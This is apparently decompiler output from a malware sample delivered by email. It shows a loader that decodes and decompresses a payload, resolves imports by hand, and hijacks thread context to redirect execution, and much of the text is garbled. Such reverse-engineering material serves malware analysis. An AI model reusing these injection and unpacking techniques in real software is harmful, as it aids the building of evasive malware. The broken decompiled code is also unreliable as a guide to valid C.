/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0156/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401030 - 0x0040104E
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 4
 */

L00401030(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    eax = Ac;
    edx = A8;
    ecx = A10;
    if(ecx != 0) {
        do {
            *edx = *eax;
            eax = eax + 1;
            edx = edx + 1;
        } while(ecx = ecx - 1);
    }
}

stack space not deallocated on return
/*	Procedure: 0x0040104F - 0x00401059
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040104F()
{



    (restore)eax;
    eax = *(ebx + 40) + esi;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x0040105A - 0x004010D7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040105A()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 20;
    (save)ebx;
    (save)esi;
    (save)edi;
    ebx = *L00402100;
    (save)edx;
    ebx = ebx + *(ebx + 60);
    (restore)edx;
    *L00402128 = *(ebx + 52);
    *(ebp - 4) = *(ebx + 6) & 255;
    (save)64;
    (save)12288;
    (save) *(ebx + 80);
    (save) *(ebx + 52);
    eax = *__imp__VirtualAlloc();
    esi = eax;
    L00401030(esi, *L00402100, *(ebx + 84));
    edi = ebx + 248;
    do {
        eax = *L00402100 + *(edi + 20);
        ecx = esi + *(edi + 12);
        eax = 0;
        eax = L00401030(ecx, eax, *(edi + 16));
        edi = edi + 40;
    } while(*(ebp - 4) = *(ebp - 4) - 1);
    (save)eax;
    goto L0040104F;
}

/*	Procedure: 0x004010D8 - 0x004010FC
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004010D8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = A8;
    edx = Ac;
    do {
        *ecx = *ecx + 4;
        *ecx = *ecx - 1;
        *ecx = *ecx + 47;
        *ecx = *ecx + 1;
        ecx = ecx + 1;
    } while(edx = edx - 1);
    *L00402008 = *L00402008 + 4;
}

/*	Procedure: 0x004010FD - 0x004011EB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L004010FD()
{
	/* unknown */ void  V4;
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = 4214920;
    ecx = *L00405074;
    *L00402000 = ecx;
    (save)ebx;
    *L00402004 = 0;
    *L00402004 = *L00402004 + ( *L00402000 << 3);
    esp = esp - 8;
    (save)0;
    V4 = 0;
    esp = esp - 4;
    *esp = 1;
    V4 = *L00402000;
    esp = esp - 8;
    *esp = 0;
    *esp = *esp | 8;
    esp = esp - 4;
    *esp = 0;
    *esp = *esp | *__imp__HeapCreate();
    eax = *__imp__HeapCreate(8);
    (restore)ebx;
    (save)ecx;
    ecx = *L00402000 + *L0040200C;
    *L0040200C = *L0040200C + 1;
    asm("loop 0x4011a2");
    *L00402008 = ecx | eax;
    V4 = *L00402000;
    esp = esp - 4;
    ecx = 4 >> 1;
    (save)esi;
    esi = *L00402008;
    asm("loop 0x4011c9");
    L00401030();
    return(L004010D8( *L00402008, *L00402000));
}

/*	Procedure: 0x004011EC - 0x004011FB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011EC()
{



    edx = ecx / ecx % ecx / ecx;
    ebx = ebx + (eax << 2);
    esi = *L00402108;
    return(0);
}

/*	Procedure: 0x004011FC - 0x00401275
 *	Argument size: -4
 *	Local size: 4
 *	Save regs size: 0
 */

L004011FC()
{
	/* unknown */ void  Vfffffffc;



    asm("pusha");
    esi = *L00402128;
    ebx = *( *(esi + 60) + esi + 128) + esi;
    do {
        (save) *(ebx + 12) + *L00402128;
        Vfffffffc = *__imp__LoadLibraryA();
        esi = *ebx + *L00402128;
        edi = *(ebx + 16) + *L00402128;
        do {
            (save) *esi + *L00402128 + 2;
            (save)Vfffffffc;
            *edi = *__imp__GetProcAddress();
            edi = edi + 1 + 3;
            esi = esi + 4;
        } while(*esi != 0);
L0040126b:
    } while(ebx = ebx - 2 + 22);
    goto L00401271;
    L004c8df2();
    goto L0040126b;
L00401271:
    eax = 0;
    asm("popa");
}

/*	Procedure: 0x00401276 - 0x00401290
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401276()
{



    (save)ebx;
    eax = 0;
    == ? L0040127c : ;
    eax = L184d9de4();
    *eax = *eax + al;
    *(ebx + 495661129) = *(ebx + 495661129) + cl;
    *ecx = *ecx - ah;
    eax = eax + 1;
    *(ecx + -1017444263) = *(ecx + -1017444263) + cl;
}

/* DEST BLOCK NOT FOUND: 0040129d -> 00401303 */
/*	Procedure: 0x00401291 - 0x004012A5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401291()
{



    L004011FC();
    return(L00401276());
    asm("outsb");
    == ? L00401303 : ;
    asm("insb");
    asm("insb");
    asm("%f insb");
    asm("insb");
    *(ebp - 117) = *(ebp - 117) + dl;
}

/*	Procedure: 0x004012A6 - 0x004012D5
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004012A6(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)"ntdll.dll";
    eax = *__imp__LoadLibraryA();
    if(A8 == 0) {
        (save)"ZwGetContextThread";
    } else {
        (save)"ZwSetContextThread";
    }
    eax = *__imp__GetProcAddress(eax);
    *Ac = eax;
}

/*	Procedure: 0x004012FC - 0x0040131F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004012FC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)0;
    (save)0;
    eax = *__imp__HeapAlloc( *__imp__HeapCreate(), 8, Ac, 1);
    *A8 = eax;
    return(*A8);
}

/*	Procedure: 0x00401320 - 0x00401343
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401320()
{
	/* unknown */ void  ebx;



    ebx = *L00402104;
    eax = 160;
    edx = 1 & 255;
    do {
        *ebx = dh;
        *(ebx + 1) = dl;
        ebx = ebx + eax;
    } while(dl = dl + 1);
    *L00402110 = edx;
}

/*	Procedure: 0x00401344 - 0x0040139F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401344()
{
	/* unknown */ void  Vfffffffc;



    Vfffffffc = ebp;
    esp = esp - 4;
    ebp = esp;
    (save)esi;
    (save)edi;
    (save)ebx;
    edx = 0;
    ecx = 32;
    (save) *L0040210C;
    ebx = *L00402008;
    (restore)eax;
    L004011EC();
    (save)esi;
    do {
        esi = esi - 1;
        edi = *ebx;
        asm("bswap edi");
        cl = dl;
        edi = edi << cl >> 31;
        if(edi != 0) {
            eax = eax + (edi << esi);
        }
        edx = edx + 1;
        if(edx == 32) {
            ebx = ebx + 4;
            edx = 0;
        }
    } while(esi != 0);
    (restore)ecx;
    *L0040210C = *L0040210C + ecx;
    (restore)ebx;
    (restore)edi;
    (restore)esi;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x004013A0 - 0x004013C9
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004013A0(A8)
/* unknown */ void  A8;
{



    asm("pusha");
    edi = 4202512;
    ebx = *L00402104;
    ecx = 160;
    asm("mul ecx");
    ebx = ebx + A8;
    ecx = ( *ebx & 255) + 1;
    esi = ebx;
    asm("rep movsb");
    asm("popa");
}

/*	Procedure: 0x004013CA - 0x004013E3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L004013CA()
{
	/* unknown */ void  ebx;



    ebx = 4202512;
    *L00402010 = *L00402010 + 1;
    eax = 0;
    ebx = ebx + ( *ebx & 255);
    *ebx = *L0040211C & 255;
    return(*ebx);
}

/*	Procedure: 0x004013E4 - 0x0040140D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013E4()
{



    asm("pusha");
    edi = *L00402100 + *L00402114;
    *L00402114 = *L00402114 + ( *L00402010 & 255);
    esi = 4202513;
    asm("rep movsb");
    *L00402118 = edi;
    asm("popa");
}

/*	Procedure: 0x0040140E - 0x0040141E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040140E()
{



    *L0040211C = *L00402011;
    return(*L0040211C);
}

/* DEST BLOCK NOT FOUND: 0040142b -> 00401441 */
/*	Procedure: 0x0040141F - 0x00401441
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040141F()
{



    if(*L00402110 == 512) {
        *L00402110 = 256;
        *L00402108 = 9;
    }
}

/* DEST BLOCK NOT FOUND: 00401481 -> 00401097 */
/*	Procedure: 0x00401442 - 0x00401485
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401442()
{
	/* unknown */ void  ebx;



    (save) *L00402110;
    ebx = *L00402104;
    (restore)eax;
    ecx = 160;
    asm("mul ecx");
    ebx = ebx + eax;
    esi = 4202513;
    *ebx = *L00402010 & 255;
    ebx = ebx + 1;
    edi = ebx;
    asm("rep movsb");
    *L00402110 = *L00402110 + 1;
    return(L0040141F());
    (save)esi;
    *__imp__VirtualAlloc();
    goto L00401097;
}

/*	Procedure: 0x00401486 - 0x0040153C
 *	Argument size: 0
 *	Local size: 16
 *	Save regs size: 4
 */

L00401486()
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    L004012FC(4202752, 60000);
    L004012FC(4202756, 12800000);
    L00401320();
    *L00402108 = 9;
    eax = L00401344();
    Vfffffff8 = eax;
    L004013A0(Vfffffff8);
    L004013E4();
    for(eax = L0040140E(); *L00402004 - *L0040210C >= *L00402108; Vfffffff8 = eax) {
        eax = L00401344();
        Vfffffffc = eax;
        if(Vfffffffc <= *L00402110 - 1) {
            L004013A0(Vfffffffc);
        } else {
            L004013A0(Vfffffff8);
            L004013CA();
        }
        L004013E4();
        L0040140E();
        L004013A0(Vfffffff8);
        L004013CA();
        L00401442();
        eax = Vfffffffc;
    }
}

stack space not deallocated on return
/*	Procedure: 0x0040153D - 0x00401548
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040153D()
{



    return(L00401291(L0040105A()));
}

stack space not deallocated on return
/*	Procedure: 0x00401549 - 0x00401574
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401549()
{



    *(ebp - 8) = *__imp__GetCurrentThread();
    edx = 0x401587;
    eax = *__imp__CreateThread(0, 0, *(ebp + 12) + 1, 0, 4, 0);
    *(ebp - 4) = eax;
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x00401575 - 0x00401587
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401575()
{



    *__imp__ResumeThread();
    return(*__imp__SuspendThread( *(ebp - 8), *(ebp - 4)));
}

stack space not deallocated on return
/*	Procedure: 0x00401588 - 0x004015D5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401588()
{



    esi = ebp + -724;
    *esi = 65538;
    (save)esi;
    (save) *(ebp - 4);
    *__imp__GetThreadContext();
    eax = *(ebp + 12);
    *(esi + 176) = eax;
    (save)esi;
    (save) *(ebp - 4);
    (save)4202788;
    (save)1;
    "U‹ìhœ@"();
    eax = *( *L00402124 + 1) & 255;
    *L00402124 = *L00402124 + 5;
    return(*L00402124());
}

/*	Procedure: 0x004015D6 - 0x004015F4
 *	Argument size: 4
 *	Local size: 724
 *	Save regs size: 4
 */

L004015D6()
{
	/* unknown */ void  esi;



    L00401549();
    L00401588();
    return(L00401575());
}

stack space not deallocated on return
/*	Procedure: 0x004015F5 - 0x00401616
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ebp;
    ebp = esp;
    (save)0x401607;
    L004015D6(0x401616);
    L004010FD();
    L00401486();
    return(L0040153D());
}

/*	Procedure: 0x00401617 - 0x00401617
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401617()
{



    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x00401004       0 */ /* unknown */ void 	__imp__GetCurrentThread;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__GetThreadContext;
/* 0x00401010       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401014       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401018       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__ResumeThread;
/* 0x00401020       0 */ /* unknown */ void 	__imp__SuspendThread;
/* 0x00401024       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x004015f5       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
